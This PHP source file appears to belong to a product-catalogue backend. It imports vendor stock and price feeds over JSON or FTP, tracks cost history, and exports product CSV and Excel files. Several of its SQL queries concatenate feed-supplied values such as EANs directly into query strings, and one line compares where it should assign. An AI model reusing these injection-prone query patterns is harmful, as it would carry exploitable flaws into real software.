        $veriSonuc = GetDataFromJson($import);
    if(! $veriSonuc)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

    $dInfo = Config('app.DB_INFO_LOCAL');
    if(! isLocalhost())
    {
        global $STATUS;
        if($STATUS == "PRODUCTION")
            $dInfo = Config('app.DB_INFO');
        else
            $dInfo = Config('app.DB_INFO_TEST');
    }

    DbPdo::Set($dInfo['host'], $dInfo['db_name'], $dInfo['username'], $dInfo['password']);

    $tumVeriler = ProductDb::GetAll($import->VendorId);
    $dbVeriler = [];
    foreach($tumVeriler as $dbVeri)
        $dbVeriler[$dbVeri["ean"]] = $dbVeri;
    //ArrayShortInfo($tumVeriler);

    $eklenecekVeriler = [];
    $guncellenecekVeriler = [];

    foreach ($dbVeriler as $key => $dveri)
    {
        if(! isset($veriSonuc->Veriler[$key]) && $dveri["stock"] != 0 && $dveri["price"] != 0)
        {

            $degisenVeriBilgi = [];
            $degisenVeriBilgi["id"] = $dveri["id"];
            $degisenVeriBilgi["stock"] = 0;
            $degisenVeriBilgi["price"] = 0;
            $guncellenecekVeriler[] = $degisenVeriBilgi;
        }
        /*else
        {
            foreach ($veriSonuc->Veriler[$key] as $key2 => $value)
            {
                if(isset($dveri[$key2]) && $dveri[$key2] != $veriSonuc->Veriler[$key][$key2])
                    $guncellenecekVeriler[] = $veriSonuc->Veriler[$key];
            }
        }*/
    }

    foreach ($veriSonuc->Veriler as $key => $veri)
    {
        $product = null;
        if(isset($dbVeriler[$key]))
            $product = $dbVeriler[$key];

        if(! $product)
        {
            $veri["added_import_id"] = $import->Id;
            $eklenecekVeriler[] = $veri;
        }
        else
        {
            $sart = (Kodlama::HtmlDuzelt($veri["title"]) != Kodlama::HtmlDuzelt($product["title"]))
                || (Kodlama::HtmlDuzelt($veri["description"]) != Kodlama::HtmlDuzelt($product["description"]))
                || (Kodlama::HtmlDuzelt($veri["photo_url"]) != Kodlama::HtmlDuzelt($product["photo_url"]))
                || (floatval($veri["price"]) != $product["price"])
                || (floatval($veri["stock"]) != $product["stock"]);
            if($sart)
            {
//                ArrayShortInfo($veri,2);
//                ArrayShortInfo($product,2);
                $degisenVeriBilgi["id"] = $product["id"];
                $degisenVeriBilgi["title"] = $veri["title"];
                $degisenVeriBilgi["description"] = $veri["description"];
                $degisenVeriBilgi["stock"] = $veri["stock"];
                $degisenVeriBilgi["price"] = $veri["price"];
                if(Kodlama::HtmlDuzelt($veri["photo_url"]) != Kodlama::HtmlDuzelt($product["photo_url"]))
                {
                    $degisenVeriBilgi["photo_url"] = $veri["photo_url"];
                    $degisenVeriBilgi["photo_islendi"] = 0;
                }
                if(count($degisenVeriBilgi) > 0)
                    $guncellenecekVeriler[] = $degisenVeriBilgi;
            }
            /*$degisenVeriBilgi = [];
            foreach ($veri as $key2 => $value)
            {
//                ArrayShortInfo(floatval($veri["price"]) == $product["price"],2);
//                ArrayShortInfo(floatval($veri["price"]) == $product["price"],2);
                if($product[$key2] != $value)
                {
                    $degisenVeriBilgi["id"] = $product["id"];
                    $degisenVeriBilgi[$key2] = $value;
                }

            }*/
            /*if(count($degisenVeriBilgi) > 0)
                $guncellenecekVeriler[] = $degisenVeriBilgi;*/
        }
    }
//    DB::Execute("delete from work_imports");
//    die();
    //ArrayShortInfo(count($eklenecekVeriler));
    //ArrayShortInfo(count($guncellenecekVeriler));
    //DB::Execute("truncate work_imports");
    //die();
    $anaAttrs = [];
    $ekAttrs = [];
    foreach ($import->AttributesInfo as $iAttr)
    {
        if($iAttr->AttributeProductFieldName != "")
            $anaAttrs[$iAttr->AttributeName] = $iAttr;
        else
            $ekAttrs[$iAttr->AttributeName] = $iAttr;
    }

    $ps = [];

    if(count($eklenecekVeriler) > 0)
    {
        foreach ($eklenecekVeriler as $eVeri)
        {
            $vendorProduct = new VendorProduct();
            foreach ($anaAttrs as $iAttr)
                $vendorProduct->{$iAttr->AttributeProductFieldName} = $eVeri[$iAttr->AttributeName];
            foreach ($ekAttrs as $iAttr)
                $vendorProduct->{$iAttr->AttributeProductFieldName} = $eVeri[$iAttr->AttributeName];
            $vendorProduct->VendorId = $import->VendorId;
            $vendorProduct->AddedImportId = $import->Id;
            $productId = DB::FetchScalar("select id from products WHERE ean='".$vendorProduct->Ean."'");
            if(! $productId)
            {
                $newProduct = new Product();
                $newProduct->Ean = $vendorProduct->Ean;
                $newProduct->AddedImportId = $import->Id;
                $newProduct->CreateDate = Tarih::Simdi();
                $newProduct->Title = $vendorProduct->Title;
                $newProduct->Description = $vendorProduct->Description;
                $newProduct->Save();
                $productId = $newProduct->Id;
            }
            $vendorProduct->ProductId = $productId;
            $vendorProduct->Save();
//            $ps[] = $product;
        }
//        ProductDB::SaveAll($eklenecekVeriler);
    }
    if(count($guncellenecekVeriler) > 0)
    {
        foreach ($guncellenecekVeriler as $gun)
        {
            foreach ($gun as $key => $value)
            {
                if ($key == "id")
                    continue;
                if(isset($anaAttrs[$key]))
                {
                    DB::Update("vendor_products","$key = '".Kodlama::HtmlDuzelt($value)."'","id=".$gun['id']);
                }
            }
            /*$guncellenecekAlanlar = [];
            $guncellenecekAlanlar[$import->SpKey."_stock"] = $gun["veri"][$import->SpKey."_stock"];
            $guncellenecekAlanlar[$import->SpKey."_cost"] = $gun["veri"][$import->SpKey."_cost"];*/
//            ProductDB::Update($gun["dbVeri"]["id"], $gun["veri"]);
        }
    }

    $importLog->AddedProductCount = count($eklenecekVeriler);
    $importLog->UpdatedProductCount = count($guncellenecekVeriler);
    $importLog->EmptyEanCount = $veriSonuc->EmptyEanCount;
    $importLog->IncorrectEanCount = $veriSonuc->IncorrectEanCount;
    $importLog->SkipProductCount += $veriSonuc->AtlananEanSayisi;

//    $importLog->CsvDosya = CsvDosyaGetir($import->CompanyId, $import->ProjectId);

    $importLog->FinishedTime = Tarih::Simdi();
    $importLog->Save();
    return 1;
}

function ControlValidate($import, $veriler)
{
    $spKey = StringLib::UcFirst($import->SpKey);
    $controlDbVeriler = [];
    $controlAllData = GetAllControlProducts($spKey, $import->CompanyId, $import->ProjectId,$import->Id);
    foreach($controlAllData as $controlDbVeri)
        $controlDbVeriler[$controlDbVeri->Ean] = $controlDbVeri;

    foreach ($controlDbVeriler as $ean => $cDbVeri)
    {
        if(isset($veriler[$ean]))
        {
            $veri = $veriler[$ean];
            $floatDbVeriYesterdayCost = floatval($cDbVeri->YesterdayCost);
            $floatDbVeriCost = floatval($cDbVeri->Cost);
            $floatVeriCost = floatval($veri[$import->SpKey . "_cost"]);
            $work = false;
            if(($floatDbVeriCost != 0 || $floatVeriCost != 0) && $floatDbVeriCost != $floatVeriCost)
                $work = true;
            if($floatDbVeriYesterdayCost != $floatDbVeriCost)
                $work = true;

            if($work)
            {
                if($floatVeriCost != 0)
                {
                    $costDiff = $floatDbVeriYesterdayCost - $floatVeriCost;
                    $avgDiff = $cDbVeri->Average - $floatVeriCost;
                    if(($costDiff > 0 && ($costDiff/$floatDbVeriYesterdayCost) > 0.4) || ($avgDiff > 0 && ($avgDiff/$cDbVeri->Average) > 0.4))
                    {
                        $blockedProduct = new BlockedProduct();
                        $blockedProduct->CompanyId = $import->CompanyId;
                        $blockedProduct->ProjectId = $import->ProjectId;
                        $blockedProduct->Ean = $ean;
                        $blockedProduct->AddedImportId = $import->Id;
                        $blockedProduct->EklenmeTarihi = Tarih::Simdi();
                        $blockedProduct->Save();
                    }
                }

                DB::Update(strtolower($import->SpKey) . "_controls","cost='$floatVeriCost'","id=$cDbVeri->Id");
            }
        }
    }
}
function AddArchives($import, $veriSonuc)
{

    $spKey = StringLib::UcFirst($import->SpKey);
    $controlDbVeriler = [];
    $controlAllData = GetAllControlProducts($spKey, $import->CompanyId, $import->ProjectId,$import->Id);
    foreach($controlAllData as $controlDbVeri)
        $controlDbVeriler[$controlDbVeri->Ean] = $controlDbVeri;

    $dbClassName = $spKey . "ArchiveDb";
    $controlDbClassName = $spKey . "ControlDb";
    $bugun = Tarih::Bugun(true);
    $lastArchiveDate = GenelDb::GetValue($spKey . "_Archive_" . $import->Id);
    if($lastArchiveDate == "" || $lastArchiveDate != $bugun)
    {
        $archiveAllData = GetAllArchiveProducts($spKey, $import->CompanyId, $import->ProjectId,$import->Id);
        GenelDb::SetValue($spKey. "_Archive_" . $import->Id,$bugun);
        $archiveDbVeriler = [];
        foreach($archiveAllData as $archiveDbVeri)
            $archiveDbVeriler[$archiveDbVeri->Ean] = $archiveDbVeri;

        $vInfos = [];
        foreach ($archiveDbVeriler as $ean => $dveri)
        {
            if(! isset($veriSonuc->Veriler[$ean]))
            {
                $v = [];
                $v["company_id"] = $import->CompanyId;
                $v["project_id"] = $import->ProjectId;
                $v["ean"] = $ean;
                $v["stock"] = 0;
                $v["cost"] = 0;
                $v["added_import_id"] = $import->Id;
                $v["cost_date"] = $bugun;
                $vInfos[] = $v;
            }
        }
        foreach ($veriSonuc->Veriler as $key => $veri)
        {
            $v = [];
            $v["company_id"] = $import->CompanyId;
            $v["project_id"] = $import->ProjectId;
            $v["ean"] = $veri["ean"];
            $v["stock"] = $veri[$import->SpKey . "_stock"];
            $v["cost"] = $veri[$import->SpKey . "_cost"];
            $v["added_import_id"] = $import->Id;
            $v["cost_date"] = $bugun;
            $vInfos[] = $v;
        }
        if(count($vInfos) > 0)
            call_user_func([$dbClassName, "SaveAll"],$vInfos);

        //Control tablosuna eklenecek ve güncellenecek olanlar için diziler oluştur
        $addCvInfos = [];
        $updateCvInfos = [];
        foreach ($vInfos as $vInfo)
        {
            $cvInfo = [];
            $cvInfo["company_id"] = $import->CompanyId;
            $cvInfo["project_id"] = $import->ProjectId;
            $cvInfo["ean"] = $vInfo["ean"];
            $cvInfo["stock"] = $vInfo["stock"];
            $cvInfo["cost"] = $vInfo["cost"];
            $cvInfo["yesterday_cost"] = $vInfo["cost"];
            $cvInfo["cost_date"] = $bugun;
            $cvInfo["added_import_id"] = $import->Id;
            $cvInfo["average"] = $vInfo["cost"];
            $cvInfo["average_count"] = 0;
            if(! isset($controlDbVeriler[$vInfo["ean"]]))
                $addCvInfos[] = $cvInfo;
            else
            {
                $floatDbYesterdayCost = floatval($controlDbVeriler[$vInfo["ean"]]->YesterdayCost);
                $floatVInfoCost = floatval($vInfo["cost"]);
                if($floatDbYesterdayCost != $floatVInfoCost || $controlDbVeriler[$vInfo["ean"]]->Average != $floatVInfoCost)
                {
                    $cvInfo["average"] = (($controlDbVeriler[$vInfo["ean"]]->Average * $controlDbVeriler[$vInfo["ean"]]->AverageCount) + $floatVInfoCost) / ($controlDbVeriler[$vInfo["ean"]]->AverageCount + 1);
                    $cvInfo["yesterday_cost"] = $controlDbVeriler[$vInfo["ean"]]->Cost;
                    $cvInfo["id"] = $controlDbVeriler[$vInfo["ean"]]->Id;
                    $updateCvInfos[] = $cvInfo;
                }


                /*// Taşınacak
                $floatDbYesterdayCost = floatval($controlDbVeriler[$vInfo["ean"]]->YesterdayCost);
                $floatVInfoCost = floatval($vInfo["cost"]);
                $floatDbCost = floatval($controlDbVeriler[$vInfo["ean"]]->Cost);
                $cvInfo["closed_product"] = $controlDbVeriler[$vInfo["ean"]]->ClosedProduct;
                $work = false;
                if($floatDbYesterdayCost != $floatDbCost)
                    $work = true;
                if(($floatDbCost != 0 || $floatVInfoCost != 0) && $floatDbCost != $floatVInfoCost)
                    $work = true;

                if($work)
                {
                    if($floatVInfoCost != 0)
                    {
                        $costDiff = $floatDbCost - $floatVInfoCost;
                        if(($costDiff/$floatDbCost) > 0.4)
                        {
                            $blockedProduct = new BlockedProduct();
                            $blockedProduct->CompanyId = $import->CompanyId;
                            $blockedProduct->ProjectId = $import->ProjectId;
                            $blockedProduct->Ean = $vInfo["ean"];
                            $blockedProduct->AddedImportId = $import->Id;
                            $blockedProduct->EklenmeTarihi = Tarih::Simdi();
                            $blockedProduct->Save();
                            $cvInfo["closed_product"] = 1;
                        }
                    }
                    $cvInfo["yesterday_cost"] = $controlDbVeriler[$vInfo["ean"]]->Cost;
                    $updateCvInfos[] = $cvInfo;
                }*/
            }
        }

        if(count($addCvInfos) > 0)
            call_user_func([$controlDbClassName, "SaveAll"],$addCvInfos);
        foreach ($updateCvInfos as $updateCvInfo)
            DB::Update(strtolower($import->SpKey). "_controls","yesterday_cost='" . $updateCvInfo['yesterday_cost'] . "',average='".$updateCvInfo['average']."'"
            , "id='".$updateCvInfo['id']."'");
        DB::Update(strtolower($import->SpKey). "_controls","cost_date='$bugun',average_count=(average_count + 1)", "company_id=$import->CompanyId AND project_id=$import->ProjectId AND added_import_id=$import->Id");
    }
}

function GetAllArchiveProducts($spKey, $companyId, $projectId, $importId)
{
    $lastArchiveDate = GenelDb::GetValue($spKey . "_Archive_" . $importId);
    if($lastArchiveDate == "")
        $lastArchiveDate == Tarih::GunEkle(Tarih::Bugun(true),-1);
    $dbName = $spKey . 'Archive';

    $className = $dbName;
    $paramsMethodName = "AsParams";
    $params = call_user_func([$className, $paramsMethodName]);
    $params->CompanyId = Condition::EQ($companyId);
    $params->ProjectId = Condition::EQ($projectId);
    $params->CostDate = Condition::EQ($lastArchiveDate);
    $params->AddedImportId = Condition::EQ($importId);

    $dbClassName = $dbName . 'Db'; // Sonuç 'Sp5ArchiveDb'
    $methodName = 'Get';

    $dbGet = call_user_func([$dbClassName, $methodName]);
    $list = $dbGet->GetList($params);
    return $list;
}

function GetAllControlProducts($spKey, $companyId, $projectId, $importId)
{
    $dbName = $spKey . 'Control';

    $className = $dbName;
    $paramsMethodName = "AsParams";
    $params = call_user_func([$className, $paramsMethodName]);
    $params->CompanyId = Condition::EQ($companyId);
    $params->ProjectId = Condition::EQ($projectId);
    $params->AddedImportId = Condition::EQ($importId);

    $dbClassName = $dbName . 'Db'; // Sonuç 'Sp5ArchiveDb'
    $methodName = 'Get';

    $dbGet = call_user_func([$dbClassName, $methodName]);
    $list = $dbGet->GetList($params);
    return $list;
}

function RunImportFtp($import, $importLog)
{
    global $SITE_KLASORU;

    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    if(! $import || $import->FromAt != 2)
    {
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "Hata oluştu";
    }

//    if(false)
//    {
        $conn_id = ftp_connect($import->FtpHost);
        $login_result = ftp_login($conn_id, $import->FtpUser, $import->FtpPassword);
        if(! $login_result)
        {
            $importLog->FinishedTime = Tarih::Simdi();
            $importLog->Save();
            return "Hata oluştu";
        }
        ftp_pasv($conn_id, true);

        $files = ftp_nlist($conn_id, $import->FtpRemoteDirectory);

        $first_file = null;
        $filePaths = [];
        $dirName = $SITE_KLASORU . "apli_dat/prv/ftp_$import->Id";
        DosyaSistem::KlasorSil($dirName);
        DosyaSistem::KlasorOlustur($dirName);
        foreach ($files as $file)
        {
            if (!is_dir($file))
            {
                $nameParts = explode("/",$file);
                $fileName = $nameParts[count($nameParts) - 1];
                $remote_file = $import->FtpRemoteDirectory . $fileName;
                $local_file =  $SITE_KLASORU . "apli_dat/prv/ftp_$import->Id/" .$fileName;
                if(ftp_get($conn_id, $local_file, $remote_file, FTP_BINARY))
                    $filePaths[] = $local_file;
//            $first_file = $file;
//            break;
            }
        }

        $patterns = ['/*.txt', '/*.TXT', '/*.EXP'];
        $files = [];

        foreach ($patterns as $pattern) {
            $files = array_merge($files, glob($dirName . $pattern));
        }

        $mergedContent = '';

        foreach ($files as $file)
        {
            $lines = file($file, FILE_IGNORE_NEW_LINES);

            if ($lines !== false)
            {
                array_shift($lines);
//            $mergedContent .= $file . "\n";
                $mergedContent .= implode("\n", $lines) . "\n";
            }
        }

        $outputFile = $dirName . '/merged.txt';
        file_put_contents($outputFile, $mergedContent);
//    }
//    $dirName = $SITE_KLASORU . "apli_dat/prv/ftp_$import->Id";
//    $outputFile = $dirName . '/merged.txt';

    if (is_file($outputFile))
    {
        /*$local_file =  $SITE_KLASORU . "apli_dat/prv/ftp_$import->Id/" .$first_file;
        $remote_file = $remote_directory . $first_file;*/

//        if(! file_exists($local_file))
        /*if(true)
        {
            if(! ftp_get($conn_id, $local_file, $remote_file, FTP_BINARY))
            {
                ftp_close($conn_id);
                $importLog->FinishedTime = Tarih::Simdi();
                $importLog->Save();
                return "Dosya indirme hatası!";
            }
        }*/

        $veriSonuc = null;
        if($import->FileType == Import::TxtFile)
            $veriSonuc = GetDataFromTxt($outputFile,$import);
        elseif($import->FileType == Import::CsvFile)
            $veriSonuc = GetDataFromCsv($import, $outputFile, $import->CsvDelimeter == "tab" ? "\t" : $import->CsvDelimeter);
        elseif($import->FileType == Import::XmlFile)
            $veriSonuc = GetDataFromXml($import, $outputFile);
        if(! $veriSonuc)
        {
            $importLog->FinishedTime = Tarih::Simdi();
            $importLog->Save();
            return "Hata oluştu";
        }

        $dInfo = Config('app.DB_INFO_LOCAL');
        if(! isLocalhost())
        {
            global $STATUS;
            if($STATUS == "PRODUCTION")
                $dInfo = Config('app.DB_INFO');
            else
                $dInfo = Config('app.DB_INFO_TEST');
        }

        DbPdo::Set($dInfo['host'], $dInfo['db_name'], $dInfo['username'], $dInfo['password']);

        $tumVeriler = ProductDb::GetAll($import->CompanyId, $import->ProjectId);
        $dbVeriler = [];
        foreach($tumVeriler as $dbVeri)
            $dbVeriler[$dbVeri["ean"]] = $dbVeri;

        $eklenecekVeriler = [];
        $guncellenecekVeriler = [];

        if($import->ImportType == Import::Main)
        {
            foreach ($veriSonuc->Veriler as $key => $veri)
            {
                $product = null;
                if(isset($dbVeriler[$key]))
                    $product = $dbVeriler[$key];

                if(! $product)
                {
                    $veri["added_import_id"] = $import->Id;
                    $eklenecekVeriler[] = $veri;
                }
                else if($product["main"] == 0)
                    $guncellenecekVeriler[] = ["veri" => $veri, "dbVeri" => $product];
                else
                    $importLog->SkipProductCount++;
            }
        }
        elseif($import->ImportType == Import::Feed)
        {
            global $STATUS;
            if($STATUS != "PRODUCTION")
            {
                AddArchives($import, $veriSonuc);
                $controlResult = ControlValidate($import, $veriSonuc->Veriler);
            }
            foreach ($dbVeriler as $key => $dveri)
            {
                if(! isset($veriSonuc->Veriler[$key]))
                {
                    if($dveri[$import->SpKey."_stock"] != 0 || $dveri[$import->SpKey."_cost"] != 0)
                    {
                        $v = [];
                        $v[$import->SpKey."_stock"] = 0;
                        $v[$import->SpKey."_cost"] = 0;
                        $guncellenecekVeriler[] = ["veri" => $v, "dbVeri" => $dveri];
                    }
                }
            }

            foreach ($veriSonuc->Veriler as $key => $veri)
            {
                $product = null;
                if(isset($dbVeriler[$key]))
                    $product = $dbVeriler[$key];

                if(! $product)
                {
                    $veri["added_import_id"] = $import->Id;
                    $eklenecekVeriler[] = $veri;
                }
                else if($product[$import->SpKey."_stock"] != $veri[$import->SpKey."_stock"] || $product[$import->SpKey."_cost"] != $veri[$import->SpKey."_cost"])
                {
                    $v = [];
                    $v[$import->SpKey."_stock"] = $veri[$import->SpKey."_stock"];
                    $v[$import->SpKey."_cost"] = $veri[$import->SpKey."_cost"];
                    $guncellenecekVeriler[] = ["veri" => $v, "dbVeri" => $product];
                }
                else
                    $importLog->SkipProductCount++;
            }
        }

        if(count($eklenecekVeriler) > 0)
            ProductDB::SaveAll($eklenecekVeriler);
        if(count($guncellenecekVeriler) > 0)
        {
            foreach ($guncellenecekVeriler as $gun)
            {
                /*$guncellenecekAlanlar = [];
                $guncellenecekAlanlar[$import->SpKey."_stock"] = $gun["veri"][$import->SpKey."_stock"];
                $guncellenecekAlanlar[$import->SpKey."_cost"] = $gun["veri"][$import->SpKey."_cost"];*/
                ProductDB::Update($gun["dbVeri"]["id"], $gun["veri"]);
            }
        }

        $importLog->AddedProductCount = count($eklenecekVeriler);
        $importLog->UpdatedProductCount = count($guncellenecekVeriler);
        $importLog->EmptyEanCount = $veriSonuc->EmptyEanCount;
        $importLog->IncorrectEanCount = $veriSonuc->IncorrectEanCount;

        ftp_close($conn_id);

//        $importLog->CsvDosya = CsvDosyaGetir($import->CompanyId, $import->ProjectId);

        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return 1;
    }
    else
    {
        ftp_close($conn_id);
        $importLog->FinishedTime = Tarih::Simdi();
        $importLog->Save();
        return "BestEXP dizininde dosya bulunamadı.";
    }
}
function CsvDosyaGetir($companyId = 0, $projectId = 0)
{
    $tumVeriler = ProductDb::GetAll($companyId, $projectId);
    if(count($tumVeriler) > 0)
    {

        $dosya_adi = AppFile::$TEMP_DIR . 'veriler_'.time().'.csv';

        $dosya = fopen($dosya_adi, 'w');

        $basliklar = [];
        foreach (array_keys($tumVeriler[0]) as $b)
        {
            $basliklar[] = $b;
        }
        $basliklar[] = "last_stock";
        $basliklar[] = "last_cost";
        fputcsv($dosya, $basliklar);

        foreach ($tumVeriler as $veri)
        {
            $veri["last_stock"] = $veri["sp1_stock"];
            $veri["last_cost"] = $veri["sp1_cost"];
            if($veri["last_stock"] > 0)
            {
                fputcsv($dosya, $veri);
            }
        }

        fclose($dosya);
        $appFile = new AppFile();
        $appFile->Yol = $dosya_adi;
        return $appFile;
    }
    return 0;
}

function GetStrippedWord($word)
{
    $word = str_replace(
        array('Ç', 'ç', 'Ş', 'ş', 'Ğ', 'ğ', 'İ', 'ı', 'Ü', 'ü', 'Ö', 'ö', ' ', '\'', '"', '/', '!', '&', '#','-'),
        array('C', 'c', 'S', 's', 'G', 'g', 'I', 'i', 'U', 'u', 'O', 'o', '_', '', '', '_', '_', '', '','_'),
        $word
    );

    return strtolower(preg_replace("/[^a-z0-9_-]/i", '_', $word));
}
function DownloadExportCsv()
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $key = $_GET["export_csv"];
    if($key != "books" && $key != "cosmetics")
        die("Hata oluştu");
    if(! is_dir(AppFile::$FILE_DIR . "veriler/". $key))
        die("Klasör bulunamadı");
    $yesterdayFolder = AppFile::$FILE_DIR . "veriler/$key/" . GetStrippedWord(Tarih::GunEkle(Tarih::Bugun(),-1));
    $dayFolder = AppFile::$FILE_DIR . "veriler/$key/" . GetStrippedWord(Tarih::Bugun());
    $list = DosyaSistem::getDirContents($dayFolder, $pattern = '.*', $withSubs = true, $type = 'file');
    if(count($list) <= 0)
    {
        $list = DosyaSistem::getDirContents($yesterdayFolder, $pattern = '.*', $withSubs = true, $type = 'file');
        if(count($list) <= 0)
            die("Export dosyası yok");
    }
    rsort($list);
    $arr = explode("/",$list[0]);
    $fName = $arr[count($arr) - 1];

    // Set headers to initiate file download
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="'.$fName.'"');
    header('Content-Length: ' . filesize($list[0]));

    // Output file
    readfile($list[0]);
    exit;
}
function ExportCsv()
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $key = $_GET["create_export_csv"];
    if($key == "books")
    {
        $params = Product::AsParams();
        $params->CompanyId = Condition::EQ(1);
        $params->ProjectId = Condition::EQ(1);
        $params->Main = Condition::EQ(1);
        $params->Sp1Stock = Condition::GT(0);

        $products = ProductDb::GetWithDetail()->GetList($params)
            ->GetStdObjArray("Id,Ean,LastSupplier,LastStock,LastCost,Sp1Stock,Sp1Cost,Isbn10,Categories,CategoriesEn,CategoriesDe,CategoriesNl,CategoriesFr,CategoriesEs,Title,Author,Publisher,Binding,Edition,NumberOfPages,Dimensions,Weight,PublishDate,Language,AmazonRank,Images,Description");
        if(count($products) > 0)
        {
            DosyaSistem::KlasorOlustur(AppFile::$FILE_DIR . "veriler/". $key);
            $dayFolder = AppFile::$FILE_DIR . "veriler/$key/" . GetStrippedWord(Tarih::Bugun());
            $fName = GetStrippedWord(time(). '_export_'.Tarih::Simdi()).'.csv';

            DosyaSistem::KlasorOlustur($dayFolder);
            $dosya_adi = $dayFolder . '/' . $fName;
            $dosya = fopen($dosya_adi, 'w');

            foreach (array_keys(get_object_vars($products[0])) as $b)
                $basliklar[] = $b;
            fputcsv($dosya, $basliklar);

//            $i = 0;
            foreach ($products as $veri)
            {
//                $i++;
                if($veri->Images != "")
                    fputcsv($dosya, get_object_vars($veri));
                /*if($i > 10)
                    break;*/
            }
            fclose($dosya);

            /*// Set headers to initiate file download
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="BooksExport-' . Tarih::Simdi() . ".csv" . '"');
            header('Content-Length: ' . filesize($dosya_adi));

            // Output file
            readfile($dosya_adi);*/
            exit;
        }
    }
    if($key == "cosmetics")
    {
        $params = Product::AsParams();
        $params->CompanyId = Condition::EQ(1);
        $params->ProjectId = Condition::EQ(2);
        $params->Main = Condition::EQ(1);
        $params->StockGt = 1;
        $products = ProductDb::GetWithDetail()->GetList($params)
            ->GetStdObjArray("Id,Ean,ProcessingStock,LastSupplier,LastStock,LastCost,SpnlStock,SpnlCost,SpfrStock,SpfrCost,Sp1Stock,Sp1Cost,Sp2Stock,Sp2Cost,Sp3Stock,Sp3Cost,Sp5Stock,Sp5Cost,Sp7Stock,Sp7Cost,Sku,Title,TitleEn,TitleDe,TitleNl,TitleFr,TitleEs,Categories,CategoriesEn,CategoriesDe,CategoriesNl,CategoriesFr,CategoriesEs,Images,Size,Brand,Gender,GenderEn,GenderDe,GenderNl,GenderFr,GenderEs,Description,DescriptionEn,DescriptionDe,DescriptionNl,DescriptionFr,DescriptionEs");

        if(count($products) > 0)
        {
            DosyaSistem::KlasorOlustur(AppFile::$FILE_DIR . "veriler/". $key);
            $dayFolder = AppFile::$FILE_DIR . "veriler/$key/" . GetStrippedWord(Tarih::Bugun());
            $fName = GetStrippedWord(time(). '_export_'.Tarih::Simdi()).'.csv';

            DosyaSistem::KlasorOlustur($dayFolder);
            $dosya_adi = $dayFolder . '/' . $fName;

            $dosya = fopen($dosya_adi, 'w');

            foreach (array_keys(get_object_vars($products[0])) as $b)
                $basliklar[] = $b;
            fputcsv($dosya, $basliklar);

//            $i = 0;
            foreach ($products as $veri)
            {
//                $i++;
                if($veri->Images != "")
                    fputcsv($dosya, get_object_vars($veri));
                /*if($i > 10)
                    break;*/
            }
            fclose($dosya);

            /*// Set headers to initiate file download
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="CosmeticsExport-' . Tarih::Simdi() . ".csv" . '"');
            header('Content-Length: ' . filesize($dosya_adi));

            // Output file
            readfile($dosya_adi);*/
            exit;
        }
    }
}
function VExportCsv($id = "")
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    if($id == "")
        $id = DB::FetchScalar("
            SELECT id FROM vendor_exports 
            WHERE last_working_time IS NULL OR 
            DATE_ADD(last_working_time, INTERVAL working_frequency MINUTE) < NOW()
            LIMIT 1
        ");

    if($id != "")
    {
        $vExport = VendorExportDb::Get()->GetById($id);
        if(! $vExport)
            return "Vendor Export bulunamadı";
        $exportFields = ["pms_id"];
        $fields = PAttributeDb::Get()->GetByIds($vExport->Fields)->GetStdObjArray("Name");
        $exportFields = array_merge($exportFields,$fields);
        $vExport->LastWorkingTime = Tarih::Simdi();
        $vExport->Save();

        $vendorProducts = GetVendorProducts($vExport);

        DosyaSistem::KlasorOlustur(AppFile::$FILE_DIR . "exports/". $vExport->Id);
        $dayFolder = AppFile::$FILE_DIR . "exports/$vExport->Id/" . GetStrippedWord(Tarih::Bugun());
        $fileExt = $vExport->Type == 1 ? "csv" : "xlsx";
        $fName = GetStrippedWord(time(). '_export_'.Tarih::Simdi()).'.'. $fileExt;

        DosyaSistem::KlasorOlustur($dayFolder);
        $dosya_adi = $dayFolder . '/' . $fName;

        if($vExport->Type == 1)
        {
            $dosya = fopen($dosya_adi, 'w');

            if(count($vendorProducts) > 0)
            {

                /*foreach (array_keys(get_object_vars(reset($vendorProducts))) as $b)
                    $basliklar[] = $b;
                fputcsv($dosya, $basliklar);*/
                fputcsv($dosya, $exportFields);

                foreach ($vendorProducts as $veri)
                {
                    $exportVeri = new stdClass();
                    foreach ($veri as $key => $value)
                        if(in_array($key,$exportFields))
                            $exportVeri->{$key} = $value;
                    fputcsv($dosya, get_object_vars($exportVeri));
                }
            }
            fclose($dosya);
        }
        else if($vExport->Type == 2)
        {
            set_include_path(get_include_path() . PATH_SEPARATOR . KNJIZ_DIR . '/others/PHPExcel');
            require_once KNJIZ_DIR . '/others/PHPExcel/PHPExcel.php';
            require_once KNJIZ_DIR . '/others/PHPExcel/PHPExcel/IOFactory.php';
            $objPHPExcel = new PHPExcel();

            // Aktif sayfayı alın
            $objPHPExcel->setActiveSheetIndex(0);
            $sheet = $objPHPExcel->getActiveSheet();

            $col = 0;
            foreach ($exportFields as $header)
            {
                $sheet->setCellValueByColumnAndRow($col, 1, $header);
                $col++;
            }

            $row = 2;
            foreach ($vendorProducts as $veri)
            {
                $col = 0;
                foreach ($exportFields as $header) {
                    $sheet->setCellValueByColumnAndRow($col, $row, $veri->{$header});
                    $col++;
                }
                $row++;
            }

            $writer = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
            $writer->save($dosya_adi);
        }
        $vExport->FilePath = $dosya_adi;
        $vExport->Save();
        return "Başarılı";
    }
    return "Record not found";

}

function GetVendorProducts($vExport, $lastRuleId = "", $returnSummary = false)
{
    set_time_limit(0);
    ini_set('memory_limit', '-1');
    ini_set('error_reporting', E_ERROR);

    $summary = new stdClass();
    $pAttrs = PAttributeDb::Get()->GetList();
    $attrValues = [
        -1 => "vendor_name"
    ];
    $selectFields = [
        "T2.name_ AS vendor_name"
    ];
    $leftJoinSelectFields = [];

    foreach ($pAttrs as $pAttr)
    {
        $attrValues[$pAttr->Id] = $pAttr->Name;
        if(!($pAttr->IsVendor && ! $pAttr->Important))
        {
            if($pAttr->Important)
